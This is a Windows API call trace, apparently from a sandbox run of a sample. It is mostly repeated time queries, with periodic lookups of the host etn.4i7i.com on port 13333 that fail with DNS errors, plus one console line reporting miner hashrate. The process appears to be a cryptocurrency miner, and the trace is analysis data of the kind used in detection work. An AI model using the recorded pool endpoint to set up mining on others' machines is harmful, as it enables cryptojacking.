GetSystemTimeAsFileTime,,0,1542888121.015
GetSystemTimeAsFileTime,,0,1542888121.015
GetSystemTimeAsFileTime,,0,1542888121.015
GetSystemTimeAsFileTime,,0,1542888121.015
GetSystemTimeAsFileTime,,0,1542888121.015
GetSystemTimeAsFileTime,,0,1542888121.015
GetSystemTimeAsFileTime,,0,1542888121.187
GetSystemTimeAsFileTime,,0,1542888121.39
GetSystemTimeAsFileTime,,0,1542888121.515
GetSystemTimeAsFileTime,,0,1542888121.515
GetSystemTimeAsFileTime,,0,1542888121.515
GetSystemTimeAsFileTime,,0,1542888121.515
GetSystemTimeAsFileTime,,0,1542888121.515
GetSystemTimeAsFileTime,,0,1542888121.515
GetSystemTimeAsFileTime,,0,1542888121.593
GetSystemTimeAsFileTime,,0,1542888121.796
GetSystemTimeAsFileTime,,0,1542888122.0
GetSystemTimeAsFileTime,,0,1542888122.015
GetSystemTimeAsFileTime,,0,1542888122.015
GetSystemTimeAsFileTime,,0,1542888122.015
GetSystemTimeAsFileTime,,0,1542888122.015
GetSystemTimeAsFileTime,,0,1542888122.015
GetSystemTimeAsFileTime,,0,1542888122.015
GetSystemTimeAsFileTime,,0,1542888122.203
GetSystemTimeAsFileTime,,0,1542888122.406
GetSystemTimeAsFileTime,,0,1542888122.531
GetSystemTimeAsFileTime,,0,1542888122.531
GetSystemTimeAsFileTime,,0,1542888122.531
GetSystemTimeAsFileTime,,0,1542888122.531
GetSystemTimeAsFileTime,,0,1542888122.531
GetSystemTimeAsFileTime,,0,1542888122.531
GetSystemTimeAsFileTime,,0,1542888122.609
GetSystemTimeAsFileTime,,0,1542888122.812
GetSystemTimeAsFileTime,,0,1542888123.015
GetSystemTimeAsFileTime,,0,1542888123.031
GetSystemTimeAsFileTime,,0,1542888123.031
GetSystemTimeAsFileTime,,0,1542888123.031
GetSystemTimeAsFileTime,,0,1542888123.031
GetSystemTimeAsFileTime,,0,1542888123.031
GetSystemTimeAsFileTime,,0,1542888123.031
GetSystemTimeAsFileTime,,0,1542888123.218
GetSystemTimeAsFileTime,,0,1542888123.421
GetSystemTimeAsFileTime,,0,1542888123.546
GetSystemTimeAsFileTime,,0,1542888123.546
GetSystemTimeAsFileTime,,0,1542888123.546
GetSystemTimeAsFileTime,,0,1542888123.546
GetSystemTimeAsFileTime,,0,1542888123.546
GetSystemTimeAsFileTime,,0,1542888123.546
GetSystemTimeAsFileTime,,0,1542888123.625
GetSystemTimeAsFileTime,,0,1542888123.828
GetSystemTimeAsFileTime,,0,1542888124.031
GetSystemTimeAsFileTime,,0,1542888124.046
GetSystemTimeAsFileTime,,0,1542888124.046
GetSystemTimeAsFileTime,,0,1542888124.046
GetSystemTimeAsFileTime,,0,1542888124.046
GetSystemTimeAsFileTime,,0,1542888124.046
GetSystemTimeAsFileTime,,0,1542888124.046
GetSystemTimeAsFileTime,,0,1542888124.234
GetSystemTimeAsFileTime,,0,1542888124.437
GetSystemTimeAsFileTime,,0,1542888124.562
GetSystemTimeAsFileTime,,0,1542888124.562
GetSystemTimeAsFileTime,,0,1542888124.562
GetSystemTimeAsFileTime,,0,1542888124.562
GetSystemTimeAsFileTime,,0,1542888124.562
GetSystemTimeAsFileTime,,0,1542888124.562
GetSystemTimeAsFileTime,,0,1542888124.64
GetSystemTimeAsFileTime,,0,1542888124.843
GetSystemTimeAsFileTime,,0,1542888125.046
GetSystemTimeAsFileTime,,0,1542888125.078
GetSystemTimeAsFileTime,,0,1542888125.078
GetSystemTimeAsFileTime,,0,1542888125.078
GetSystemTimeAsFileTime,,0,1542888125.078
GetSystemTimeAsFileTime,,0,1542888125.078
GetSystemTimeAsFileTime,,0,1542888125.078
GetSystemTimeAsFileTime,,0,1542888125.25
GetSystemTimeAsFileTime,,0,1542888125.453
GetSystemTimeAsFileTime,,0,1542888125.578
GetSystemTimeAsFileTime,,0,1542888125.578
GetSystemTimeAsFileTime,,0,1542888125.578
GetSystemTimeAsFileTime,,0,1542888125.578
GetSystemTimeAsFileTime,,0,1542888125.578
GetSystemTimeAsFileTime,,0,1542888125.578
GetSystemTimeAsFileTime,,0,1542888125.656
GetSystemTimeAsFileTime,,0,1542888125.859
GetSystemTimeAsFileTime,,0,1542888126.062
GetSystemTimeAsFileTime,,0,1542888126.078
GetSystemTimeAsFileTime,,0,1542888126.078
GetSystemTimeAsFileTime,,0,1542888126.078
GetSystemTimeAsFileTime,,0,1542888126.078
GetSystemTimeAsFileTime,,0,1542888126.078
GetSystemTimeAsFileTime,,0,1542888126.078
GetSystemTimeAsFileTime,,0,1542888126.265
GetSystemTimeAsFileTime,,0,1542888126.468
GetSystemTimeAsFileTime,,0,1542888126.593
GetSystemTimeAsFileTime,,0,1542888126.593
GetSystemTimeAsFileTime,,0,1542888126.593
GetSystemTimeAsFileTime,,0,1542888126.593
GetSystemTimeAsFileTime,,0,1542888126.593
GetSystemTimeAsFileTime,,0,1542888126.593
GetAddrInfoW,etn.4i7i.com#,11001,1542888126.625
GetSystemTimeAsFileTime,,0,1542888126.625
GetFileType,0x00000007,2,1542888126.625
WriteConsoleW,[2018-11-22 21:42:06]#0x0000000f,1,1542888126.625
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888126.625
GetSystemTimeAsFileTime,,0,1542888126.671
GetSystemTimeAsFileTime,,0,1542888126.875
GetSystemTimeAsFileTime,,0,1542888127.078
GetSystemTimeAsFileTime,,0,1542888127.109
GetSystemTimeAsFileTime,,0,1542888127.109
GetSystemTimeAsFileTime,,0,1542888127.109
GetSystemTimeAsFileTime,,0,1542888127.109
GetSystemTimeAsFileTime,,0,1542888127.109
GetSystemTimeAsFileTime,,0,1542888127.109
GetSystemTimeAsFileTime,,0,1542888127.281
GetSystemTimeAsFileTime,,0,1542888127.484
GetSystemTimeAsFileTime,,0,1542888127.625
GetSystemTimeAsFileTime,,0,1542888127.625
GetSystemTimeAsFileTime,,0,1542888127.625
GetSystemTimeAsFileTime,,0,1542888127.625
GetSystemTimeAsFileTime,,0,1542888127.625
GetSystemTimeAsFileTime,,0,1542888127.625
GetSystemTimeAsFileTime,,0,1542888127.687
GetSystemTimeAsFileTime,,0,1542888127.89
GetSystemTimeAsFileTime,,0,1542888128.093
GetSystemTimeAsFileTime,,0,1542888128.125
GetSystemTimeAsFileTime,,0,1542888128.125
GetSystemTimeAsFileTime,,0,1542888128.125
GetSystemTimeAsFileTime,,0,1542888128.125
GetSystemTimeAsFileTime,,0,1542888128.125
GetSystemTimeAsFileTime,,0,1542888128.125
GetSystemTimeAsFileTime,,0,1542888128.296
GetSystemTimeAsFileTime,,0,1542888128.5
GetSystemTimeAsFileTime,,0,1542888128.64
GetSystemTimeAsFileTime,,0,1542888128.64
GetSystemTimeAsFileTime,,0,1542888128.64
GetSystemTimeAsFileTime,,0,1542888128.64
GetSystemTimeAsFileTime,,0,1542888128.64
GetSystemTimeAsFileTime,,0,1542888128.64
GetSystemTimeAsFileTime,,0,1542888128.703
GetSystemTimeAsFileTime,,0,1542888128.906
GetSystemTimeAsFileTime,,0,1542888129.109
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.14
GetSystemTimeAsFileTime,,0,1542888129.312
GetSystemTimeAsFileTime,,0,1542888129.515
GetSystemTimeAsFileTime,,0,1542888129.656
GetSystemTimeAsFileTime,,0,1542888129.656
GetSystemTimeAsFileTime,,0,1542888129.656
GetSystemTimeAsFileTime,,0,1542888129.656
GetSystemTimeAsFileTime,,0,1542888129.656
GetSystemTimeAsFileTime,,0,1542888129.656
GetSystemTimeAsFileTime,,0,1542888129.718
GetSystemTimeAsFileTime,,0,1542888129.921
GetSystemTimeAsFileTime,,0,1542888130.125
GetSystemTimeAsFileTime,,0,1542888130.171
GetSystemTimeAsFileTime,,0,1542888130.171
GetSystemTimeAsFileTime,,0,1542888130.171
GetSystemTimeAsFileTime,,0,1542888130.171
GetSystemTimeAsFileTime,,0,1542888130.171
GetSystemTimeAsFileTime,,0,1542888130.171
GetSystemTimeAsFileTime,,0,1542888130.328
GetSystemTimeAsFileTime,,0,1542888130.531
GetSystemTimeAsFileTime,,0,1542888130.671
GetSystemTimeAsFileTime,,0,1542888130.671
GetSystemTimeAsFileTime,,0,1542888130.671
GetSystemTimeAsFileTime,,0,1542888130.671
GetSystemTimeAsFileTime,,0,1542888130.671
GetSystemTimeAsFileTime,,0,1542888130.671
GetSystemTimeAsFileTime,,0,1542888130.734
GetSystemTimeAsFileTime,,0,1542888130.937
GetSystemTimeAsFileTime,,0,1542888131.14
GetSystemTimeAsFileTime,,0,1542888131.187
GetSystemTimeAsFileTime,,0,1542888131.187
GetSystemTimeAsFileTime,,0,1542888131.187
GetSystemTimeAsFileTime,,0,1542888131.187
GetSystemTimeAsFileTime,,0,1542888131.187
GetSystemTimeAsFileTime,,0,1542888131.187
GetSystemTimeAsFileTime,,0,1542888131.343
GetSystemTimeAsFileTime,,0,1542888131.546
GetSystemTimeAsFileTime,,0,1542888131.687
GetSystemTimeAsFileTime,,0,1542888131.687
GetSystemTimeAsFileTime,,0,1542888131.687
GetSystemTimeAsFileTime,,0,1542888131.687
GetSystemTimeAsFileTime,,0,1542888131.687
GetSystemTimeAsFileTime,,0,1542888131.687
GetSystemTimeAsFileTime,,0,1542888131.75
GetSystemTimeAsFileTime,,0,1542888131.953
GetSystemTimeAsFileTime,,0,1542888132.156
GetSystemTimeAsFileTime,,0,1542888132.187
GetSystemTimeAsFileTime,,0,1542888132.187
GetSystemTimeAsFileTime,,0,1542888132.187
GetSystemTimeAsFileTime,,0,1542888132.187
GetSystemTimeAsFileTime,,0,1542888132.187
GetSystemTimeAsFileTime,,0,1542888132.187
GetSystemTimeAsFileTime,,0,1542888132.359
GetSystemTimeAsFileTime,,0,1542888132.562
GetSystemTimeAsFileTime,,0,1542888132.703
GetSystemTimeAsFileTime,,0,1542888132.703
GetSystemTimeAsFileTime,,0,1542888132.703
GetSystemTimeAsFileTime,,0,1542888132.703
GetSystemTimeAsFileTime,,0,1542888132.703
GetSystemTimeAsFileTime,,0,1542888132.703
GetSystemTimeAsFileTime,,0,1542888132.765
GetSystemTimeAsFileTime,,0,1542888132.968
GetSystemTimeAsFileTime,,0,1542888133.171
GetSystemTimeAsFileTime,,0,1542888133.203
GetSystemTimeAsFileTime,,0,1542888133.203
GetSystemTimeAsFileTime,,0,1542888133.203
GetSystemTimeAsFileTime,,0,1542888133.203
GetSystemTimeAsFileTime,,0,1542888133.203
GetSystemTimeAsFileTime,,0,1542888133.203
GetSystemTimeAsFileTime,,0,1542888133.375
GetSystemTimeAsFileTime,,0,1542888133.578
GetSystemTimeAsFileTime,,0,1542888133.718
GetSystemTimeAsFileTime,,0,1542888133.718
GetSystemTimeAsFileTime,,0,1542888133.718
GetSystemTimeAsFileTime,,0,1542888133.718
GetSystemTimeAsFileTime,,0,1542888133.718
GetSystemTimeAsFileTime,,0,1542888133.718
GetSystemTimeAsFileTime,,0,1542888133.781
GetSystemTimeAsFileTime,,0,1542888133.984
GetSystemTimeAsFileTime,,0,1542888134.187
GetSystemTimeAsFileTime,,0,1542888134.234
GetSystemTimeAsFileTime,,0,1542888134.234
GetSystemTimeAsFileTime,,0,1542888134.234
GetSystemTimeAsFileTime,,0,1542888134.234
GetSystemTimeAsFileTime,,0,1542888134.234
GetSystemTimeAsFileTime,,0,1542888134.234
GetSystemTimeAsFileTime,,0,1542888134.39
GetSystemTimeAsFileTime,,0,1542888134.593
GetAddrInfoW,etn.4i7i.com#,11001,1542888134.703
GetSystemTimeAsFileTime,,0,1542888134.703
GetFileType,0x00000007,2,1542888134.703
WriteConsoleW,[2018-11-22 21:42:14]#0x0000000f,1,1542888134.703
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888134.703
GetSystemTimeAsFileTime,,0,1542888134.734
GetSystemTimeAsFileTime,,0,1542888134.734
GetSystemTimeAsFileTime,,0,1542888134.734
GetSystemTimeAsFileTime,,0,1542888134.734
GetSystemTimeAsFileTime,,0,1542888134.734
GetSystemTimeAsFileTime,,0,1542888134.734
NtDuplicateObject,0x0000021c#0xffffffff#2516#2#0xffffffff#0x00000000#2516#0#0xfffffffe,0,1542888134.75
NtClose,0x00000198,0,1542888134.75
NtClose,0x00000130,0,1542888134.75
NtClose,0x00000108,0,1542888134.75
GetSystemTimeAsFileTime,,0,1542888134.796
GetSystemTimeAsFileTime,,0,1542888135.0
GetSystemTimeAsFileTime,,0,1542888135.203
GetSystemTimeAsFileTime,,0,1542888135.234
GetSystemTimeAsFileTime,,0,1542888135.234
GetSystemTimeAsFileTime,,0,1542888135.234
GetSystemTimeAsFileTime,,0,1542888135.234
GetSystemTimeAsFileTime,,0,1542888135.234
GetSystemTimeAsFileTime,,0,1542888135.234
GetSystemTimeAsFileTime,,0,1542888135.406
GetSystemTimeAsFileTime,,0,1542888135.609
GetSystemTimeAsFileTime,,0,1542888135.734
GetSystemTimeAsFileTime,,0,1542888135.734
GetSystemTimeAsFileTime,,0,1542888135.734
GetSystemTimeAsFileTime,,0,1542888135.734
GetSystemTimeAsFileTime,,0,1542888135.734
GetSystemTimeAsFileTime,,0,1542888135.734
GetSystemTimeAsFileTime,,0,1542888135.812
GetSystemTimeAsFileTime,,0,1542888136.015
GetSystemTimeAsFileTime,,0,1542888136.218
GetSystemTimeAsFileTime,,0,1542888136.25
GetSystemTimeAsFileTime,,0,1542888136.25
GetSystemTimeAsFileTime,,0,1542888136.25
GetSystemTimeAsFileTime,,0,1542888136.25
GetSystemTimeAsFileTime,,0,1542888136.25
GetSystemTimeAsFileTime,,0,1542888136.25
GetSystemTimeAsFileTime,,0,1542888136.421
GetSystemTimeAsFileTime,,0,1542888136.625
GetSystemTimeAsFileTime,,0,1542888136.75
GetSystemTimeAsFileTime,,0,1542888136.75
GetSystemTimeAsFileTime,,0,1542888136.75
GetSystemTimeAsFileTime,,0,1542888136.75
GetSystemTimeAsFileTime,,0,1542888136.75
GetSystemTimeAsFileTime,,0,1542888136.75
GetSystemTimeAsFileTime,,0,1542888136.828
GetSystemTimeAsFileTime,,0,1542888137.031
GetSystemTimeAsFileTime,,0,1542888137.234
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.265
GetSystemTimeAsFileTime,,0,1542888137.437
GetSystemTimeAsFileTime,,0,1542888137.64
GetSystemTimeAsFileTime,,0,1542888137.765
GetSystemTimeAsFileTime,,0,1542888137.765
GetSystemTimeAsFileTime,,0,1542888137.765
GetSystemTimeAsFileTime,,0,1542888137.765
GetSystemTimeAsFileTime,,0,1542888137.765
GetSystemTimeAsFileTime,,0,1542888137.765
GetSystemTimeAsFileTime,,0,1542888137.843
GetSystemTimeAsFileTime,,0,1542888138.046
GetSystemTimeAsFileTime,,0,1542888138.25
GetSystemTimeAsFileTime,,0,1542888138.281
GetSystemTimeAsFileTime,,0,1542888138.281
GetSystemTimeAsFileTime,,0,1542888138.281
GetSystemTimeAsFileTime,,0,1542888138.281
GetSystemTimeAsFileTime,,0,1542888138.281
GetSystemTimeAsFileTime,,0,1542888138.281
GetSystemTimeAsFileTime,,0,1542888138.453
GetSystemTimeAsFileTime,,0,1542888138.656
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetFileType,0x00000007,2,1542888138.781
WriteConsoleW,[2018-11-22 21:42:18] #0x0000000f,1,1542888138.781
WriteConsoleW,speed#0x0000000f,1,1542888138.781
WriteConsoleW, 2.5s/60s/15m #0x0000000f,1,1542888138.781
WriteConsoleW,n/a #0x0000000f,1,1542888138.781
WriteConsoleW,n/a n/a #0x0000000f,1,1542888138.781
WriteConsoleW,H/s#0x0000000f,1,1542888138.781
WriteConsoleW, max: #0x0000000f,1,1542888138.781
WriteConsoleW,n/a H/s#0x0000000f,1,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.781
GetSystemTimeAsFileTime,,0,1542888138.859
GetSystemTimeAsFileTime,,0,1542888139.062
GetSystemTimeAsFileTime,,0,1542888139.265
GetSystemTimeAsFileTime,,0,1542888139.296
GetSystemTimeAsFileTime,,0,1542888139.296
GetSystemTimeAsFileTime,,0,1542888139.296
GetSystemTimeAsFileTime,,0,1542888139.296
GetSystemTimeAsFileTime,,0,1542888139.296
GetSystemTimeAsFileTime,,0,1542888139.296
GetSystemTimeAsFileTime,,0,1542888139.468
GetSystemTimeAsFileTime,,0,1542888139.671
GetSystemTimeAsFileTime,,0,1542888139.796
GetSystemTimeAsFileTime,,0,1542888139.796
GetSystemTimeAsFileTime,,0,1542888139.796
GetSystemTimeAsFileTime,,0,1542888139.796
GetSystemTimeAsFileTime,,0,1542888139.796
GetSystemTimeAsFileTime,,0,1542888139.796
GetSystemTimeAsFileTime,,0,1542888139.875
GetSystemTimeAsFileTime,,0,1542888140.078
GetSystemTimeAsFileTime,,0,1542888140.281
GetSystemTimeAsFileTime,,0,1542888140.312
GetSystemTimeAsFileTime,,0,1542888140.312
GetSystemTimeAsFileTime,,0,1542888140.312
GetSystemTimeAsFileTime,,0,1542888140.312
GetSystemTimeAsFileTime,,0,1542888140.312
GetSystemTimeAsFileTime,,0,1542888140.312
GetSystemTimeAsFileTime,,0,1542888140.484
GetSystemTimeAsFileTime,,0,1542888140.687
GetSystemTimeAsFileTime,,0,1542888140.812
GetSystemTimeAsFileTime,,0,1542888140.812
GetSystemTimeAsFileTime,,0,1542888140.812
GetSystemTimeAsFileTime,,0,1542888140.812
GetSystemTimeAsFileTime,,0,1542888140.812
GetSystemTimeAsFileTime,,0,1542888140.812
GetSystemTimeAsFileTime,,0,1542888140.89
GetSystemTimeAsFileTime,,0,1542888141.093
GetSystemTimeAsFileTime,,0,1542888141.296
GetSystemTimeAsFileTime,,0,1542888141.328
GetSystemTimeAsFileTime,,0,1542888141.328
GetSystemTimeAsFileTime,,0,1542888141.328
GetSystemTimeAsFileTime,,0,1542888141.328
GetSystemTimeAsFileTime,,0,1542888141.328
GetSystemTimeAsFileTime,,0,1542888141.328
GetSystemTimeAsFileTime,,0,1542888141.5
GetSystemTimeAsFileTime,,0,1542888141.703
GetSystemTimeAsFileTime,,0,1542888141.843
GetSystemTimeAsFileTime,,0,1542888141.843
GetSystemTimeAsFileTime,,0,1542888141.843
GetSystemTimeAsFileTime,,0,1542888141.843
GetSystemTimeAsFileTime,,0,1542888141.843
GetSystemTimeAsFileTime,,0,1542888141.843
GetSystemTimeAsFileTime,,0,1542888141.906
GetSystemTimeAsFileTime,,0,1542888142.109
GetSystemTimeAsFileTime,,0,1542888142.312
GetSystemTimeAsFileTime,,0,1542888142.343
GetSystemTimeAsFileTime,,0,1542888142.343
GetSystemTimeAsFileTime,,0,1542888142.343
GetSystemTimeAsFileTime,,0,1542888142.343
GetSystemTimeAsFileTime,,0,1542888142.343
GetSystemTimeAsFileTime,,0,1542888142.343
GetSystemTimeAsFileTime,,0,1542888142.515
GetSystemTimeAsFileTime,,0,1542888142.718
GetAddrInfoW,etn.4i7i.com#,11001,1542888142.781
GetSystemTimeAsFileTime,,0,1542888142.781
GetFileType,0x00000007,2,1542888142.781
WriteConsoleW,[2018-11-22 21:42:22]#0x0000000f,1,1542888142.781
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888142.781
GetSystemTimeAsFileTime,,0,1542888142.859
GetSystemTimeAsFileTime,,0,1542888142.859
GetSystemTimeAsFileTime,,0,1542888142.859
GetSystemTimeAsFileTime,,0,1542888142.859
GetSystemTimeAsFileTime,,0,1542888142.859
GetSystemTimeAsFileTime,,0,1542888142.859
GetSystemTimeAsFileTime,,0,1542888142.921
GetSystemTimeAsFileTime,,0,1542888143.125
GetSystemTimeAsFileTime,,0,1542888143.328
GetSystemTimeAsFileTime,,0,1542888143.359
GetSystemTimeAsFileTime,,0,1542888143.359
GetSystemTimeAsFileTime,,0,1542888143.359
GetSystemTimeAsFileTime,,0,1542888143.359
GetSystemTimeAsFileTime,,0,1542888143.359
GetSystemTimeAsFileTime,,0,1542888143.359
GetSystemTimeAsFileTime,,0,1542888143.531
GetSystemTimeAsFileTime,,0,1542888143.734
GetSystemTimeAsFileTime,,0,1542888143.875
GetSystemTimeAsFileTime,,0,1542888143.875
GetSystemTimeAsFileTime,,0,1542888143.875
GetSystemTimeAsFileTime,,0,1542888143.875
GetSystemTimeAsFileTime,,0,1542888143.875
GetSystemTimeAsFileTime,,0,1542888143.875
GetSystemTimeAsFileTime,,0,1542888143.937
GetSystemTimeAsFileTime,,0,1542888144.14
GetSystemTimeAsFileTime,,0,1542888144.343
GetSystemTimeAsFileTime,,0,1542888144.375
GetSystemTimeAsFileTime,,0,1542888144.375
GetSystemTimeAsFileTime,,0,1542888144.375
GetSystemTimeAsFileTime,,0,1542888144.375
GetSystemTimeAsFileTime,,0,1542888144.375
GetSystemTimeAsFileTime,,0,1542888144.375
GetSystemTimeAsFileTime,,0,1542888144.546
GetSystemTimeAsFileTime,,0,1542888144.75
GetSystemTimeAsFileTime,,0,1542888144.89
GetSystemTimeAsFileTime,,0,1542888144.89
GetSystemTimeAsFileTime,,0,1542888144.89
GetSystemTimeAsFileTime,,0,1542888144.89
GetSystemTimeAsFileTime,,0,1542888144.89
GetSystemTimeAsFileTime,,0,1542888144.89
GetSystemTimeAsFileTime,,0,1542888144.953
GetSystemTimeAsFileTime,,0,1542888145.156
GetSystemTimeAsFileTime,,0,1542888145.359
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.406
GetSystemTimeAsFileTime,,0,1542888145.562
GetSystemTimeAsFileTime,,0,1542888145.765
GetSystemTimeAsFileTime,,0,1542888145.906
GetSystemTimeAsFileTime,,0,1542888145.906
GetSystemTimeAsFileTime,,0,1542888145.906
GetSystemTimeAsFileTime,,0,1542888145.906
GetSystemTimeAsFileTime,,0,1542888145.906
GetSystemTimeAsFileTime,,0,1542888145.906
GetSystemTimeAsFileTime,,0,1542888145.968
GetSystemTimeAsFileTime,,0,1542888146.171
GetSystemTimeAsFileTime,,0,1542888146.375
GetSystemTimeAsFileTime,,0,1542888146.406
GetSystemTimeAsFileTime,,0,1542888146.406
GetSystemTimeAsFileTime,,0,1542888146.406
GetSystemTimeAsFileTime,,0,1542888146.406
GetSystemTimeAsFileTime,,0,1542888146.406
GetSystemTimeAsFileTime,,0,1542888146.406
GetSystemTimeAsFileTime,,0,1542888146.578
GetSystemTimeAsFileTime,,0,1542888146.781
GetSystemTimeAsFileTime,,0,1542888146.921
GetSystemTimeAsFileTime,,0,1542888146.921
GetSystemTimeAsFileTime,,0,1542888146.921
GetSystemTimeAsFileTime,,0,1542888146.921
GetSystemTimeAsFileTime,,0,1542888146.921
GetSystemTimeAsFileTime,,0,1542888146.921
GetSystemTimeAsFileTime,,0,1542888146.984
GetSystemTimeAsFileTime,,0,1542888147.187
GetSystemTimeAsFileTime,,0,1542888147.39
GetSystemTimeAsFileTime,,0,1542888147.437
GetSystemTimeAsFileTime,,0,1542888147.437
GetSystemTimeAsFileTime,,0,1542888147.437
GetSystemTimeAsFileTime,,0,1542888147.437
GetSystemTimeAsFileTime,,0,1542888147.437
GetSystemTimeAsFileTime,,0,1542888147.437
GetSystemTimeAsFileTime,,0,1542888147.593
GetSystemTimeAsFileTime,,0,1542888147.796
GetSystemTimeAsFileTime,,0,1542888147.953
GetSystemTimeAsFileTime,,0,1542888147.953
GetSystemTimeAsFileTime,,0,1542888147.953
GetSystemTimeAsFileTime,,0,1542888147.953
GetSystemTimeAsFileTime,,0,1542888147.953
GetSystemTimeAsFileTime,,0,1542888147.953
GetSystemTimeAsFileTime,,0,1542888148.0
GetSystemTimeAsFileTime,,0,1542888148.203
GetSystemTimeAsFileTime,,0,1542888148.406
GetSystemTimeAsFileTime,,0,1542888148.468
GetSystemTimeAsFileTime,,0,1542888148.468
GetSystemTimeAsFileTime,,0,1542888148.468
GetSystemTimeAsFileTime,,0,1542888148.468
GetSystemTimeAsFileTime,,0,1542888148.468
GetSystemTimeAsFileTime,,0,1542888148.468
GetSystemTimeAsFileTime,,0,1542888148.609
GetSystemTimeAsFileTime,,0,1542888148.812
GetSystemTimeAsFileTime,,0,1542888148.968
GetSystemTimeAsFileTime,,0,1542888148.968
GetSystemTimeAsFileTime,,0,1542888148.968
GetSystemTimeAsFileTime,,0,1542888148.968
GetSystemTimeAsFileTime,,0,1542888148.968
GetSystemTimeAsFileTime,,0,1542888148.968
GetSystemTimeAsFileTime,,0,1542888149.015
GetSystemTimeAsFileTime,,0,1542888149.218
GetSystemTimeAsFileTime,,0,1542888149.421
GetSystemTimeAsFileTime,,0,1542888149.484
GetSystemTimeAsFileTime,,0,1542888149.484
GetSystemTimeAsFileTime,,0,1542888149.484
GetSystemTimeAsFileTime,,0,1542888149.484
GetSystemTimeAsFileTime,,0,1542888149.484
GetSystemTimeAsFileTime,,0,1542888149.484
GetSystemTimeAsFileTime,,0,1542888149.625
GetSystemTimeAsFileTime,,0,1542888149.828
GetSystemTimeAsFileTime,,0,1542888149.984
GetSystemTimeAsFileTime,,0,1542888149.984
GetSystemTimeAsFileTime,,0,1542888149.984
GetSystemTimeAsFileTime,,0,1542888149.984
GetSystemTimeAsFileTime,,0,1542888149.984
GetSystemTimeAsFileTime,,0,1542888149.984
GetSystemTimeAsFileTime,,0,1542888150.031
GetSystemTimeAsFileTime,,0,1542888150.234
GetSystemTimeAsFileTime,,0,1542888150.437
GetSystemTimeAsFileTime,,0,1542888150.5
GetSystemTimeAsFileTime,,0,1542888150.5
GetSystemTimeAsFileTime,,0,1542888150.5
GetSystemTimeAsFileTime,,0,1542888150.5
GetSystemTimeAsFileTime,,0,1542888150.5
GetSystemTimeAsFileTime,,0,1542888150.5
GetSystemTimeAsFileTime,,0,1542888150.64
GetSystemTimeAsFileTime,,0,1542888150.843
GetAddrInfoW,etn.4i7i.com#,11001,1542888150.89
GetSystemTimeAsFileTime,,0,1542888150.89
GetFileType,0x00000007,2,1542888150.89
WriteConsoleW,[2018-11-22 21:42:30]#0x0000000f,1,1542888150.89
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888150.89
GetSystemTimeAsFileTime,,0,1542888151.0
GetSystemTimeAsFileTime,,0,1542888151.0
GetSystemTimeAsFileTime,,0,1542888151.0
GetSystemTimeAsFileTime,,0,1542888151.0
GetSystemTimeAsFileTime,,0,1542888151.0
GetSystemTimeAsFileTime,,0,1542888151.0
GetSystemTimeAsFileTime,,0,1542888151.046
GetSystemTimeAsFileTime,,0,1542888151.25
GetSystemTimeAsFileTime,,0,1542888151.453
GetSystemTimeAsFileTime,,0,1542888151.515
GetSystemTimeAsFileTime,,0,1542888151.515
GetSystemTimeAsFileTime,,0,1542888151.515
GetSystemTimeAsFileTime,,0,1542888151.515
GetSystemTimeAsFileTime,,0,1542888151.515
GetSystemTimeAsFileTime,,0,1542888151.515
GetSystemTimeAsFileTime,,0,1542888151.656
GetSystemTimeAsFileTime,,0,1542888151.859
GetSystemTimeAsFileTime,,0,1542888152.015
GetSystemTimeAsFileTime,,0,1542888152.015
GetSystemTimeAsFileTime,,0,1542888152.015
GetSystemTimeAsFileTime,,0,1542888152.015
GetSystemTimeAsFileTime,,0,1542888152.015
GetSystemTimeAsFileTime,,0,1542888152.015
GetSystemTimeAsFileTime,,0,1542888152.062
GetSystemTimeAsFileTime,,0,1542888152.265
GetSystemTimeAsFileTime,,0,1542888152.468
GetSystemTimeAsFileTime,,0,1542888152.531
GetSystemTimeAsFileTime,,0,1542888152.531
GetSystemTimeAsFileTime,,0,1542888152.531
GetSystemTimeAsFileTime,,0,1542888152.531
GetSystemTimeAsFileTime,,0,1542888152.531
GetSystemTimeAsFileTime,,0,1542888152.531
GetSystemTimeAsFileTime,,0,1542888152.671
GetSystemTimeAsFileTime,,0,1542888152.875
GetSystemTimeAsFileTime,,0,1542888153.031
GetSystemTimeAsFileTime,,0,1542888153.031
GetSystemTimeAsFileTime,,0,1542888153.031
GetSystemTimeAsFileTime,,0,1542888153.031
GetSystemTimeAsFileTime,,0,1542888153.031
GetSystemTimeAsFileTime,,0,1542888153.031
GetSystemTimeAsFileTime,,0,1542888153.078
GetSystemTimeAsFileTime,,0,1542888153.281
GetSystemTimeAsFileTime,,0,1542888153.484
GetSystemTimeAsFileTime,,0,1542888153.546
GetSystemTimeAsFileTime,,0,1542888153.546
GetSystemTimeAsFileTime,,0,1542888153.546
GetSystemTimeAsFileTime,,0,1542888153.546
GetSystemTimeAsFileTime,,0,1542888153.546
